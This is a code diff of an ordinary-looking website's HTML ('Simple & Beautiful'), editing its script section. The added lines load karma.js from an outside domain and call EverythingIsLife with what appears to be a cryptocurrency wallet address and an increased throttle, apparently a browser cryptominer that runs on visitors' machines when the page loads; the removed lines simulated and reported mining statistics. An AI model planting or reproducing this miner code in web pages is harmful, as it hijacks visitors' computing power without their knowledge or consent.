@@ -44,34 +44,13 @@
         <p>&copy; 2024 Simple & Beautiful. Made with ❤️ by You. <a href="#top">Back to top</a></p>
     </footer>
 
-    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <script>
-        window.addEventListener('beforeunload', () => {
-    // Отправка последних данных перед закрытием вкладки
-    sendMiningData();
-});
+				
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 50);
+</script>
+		
 
-function sendMiningData() {
-    // Пример отправки данных
-    navigator.sendBeacon('/save-mining-data', JSON.stringify({ totalHashes }));
-}
-
-        
-        EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 20);
-
-        let totalHashes = 0; // Counter for total hashes mined
-
-        // Function to simulate hash rate retrieval and total hashes
-        setInterval(() => {
-            const hashrateElement = document.getElementById('hashrate');
-            const totalHashesElement = document.getElementById('totalHashes');
-
-            const simulatedHashrate = Math.floor(Math.random() * 100) + 1; // Simulated hash rate (replace with actual API call if available)
-            hashrateElement.textContent = `${simulatedHashrate} H/s`;
-
-            totalHashes += simulatedHashrate; // Add hash rate to total hashes
-            totalHashesElement.textContent = totalHashes.toLocaleString();
-        }, 1000); // Update every second
     </script>
 </body>
 </html>
